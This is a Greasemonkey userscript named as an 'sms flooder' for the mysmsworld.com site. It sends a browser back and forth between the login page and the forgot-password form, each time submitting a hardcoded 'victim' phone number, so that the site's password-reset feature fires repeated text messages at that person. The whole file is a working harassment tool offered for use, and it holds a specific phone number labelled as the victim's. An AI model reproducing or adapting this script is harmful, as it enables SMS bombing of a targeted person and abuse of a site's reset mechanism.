// ==UserScript==
// @name          Anonymous MYSMSWORLD.com sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*mysmsworld.com/*
// ==/UserScript==

var victim=9633087782//Enter victims number here

if(document.location=="http://www.mysmsworld.com/login.php?mode=forgetpass"||document.location=="http://www.mysmsworld.com/login.php?mode=forgetpass")
{
document.forms[1].elements[0].value=victim;
document.forms[1].submit();
}
if(document.location=="http://www.mysmsworld.com/login.php"||document.location=="http://www.mysmsworld.com/login.php")
document.location='http://www.mysmsworld.com/login.php?mode=forgetpass';